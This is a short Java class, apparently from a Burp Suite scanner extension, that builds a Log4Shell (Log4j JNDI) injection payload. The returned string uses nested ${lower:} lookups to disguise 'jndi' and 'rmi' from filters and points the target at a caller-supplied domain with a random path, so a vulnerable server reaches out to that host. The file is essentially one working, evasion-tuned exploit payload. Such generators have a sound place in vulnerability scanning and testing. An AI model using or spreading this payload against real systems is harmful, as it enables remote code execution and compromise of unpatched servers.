package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

public class POC5 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${${lower:${lower:jndi}}:${lower:rmi}://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }
}
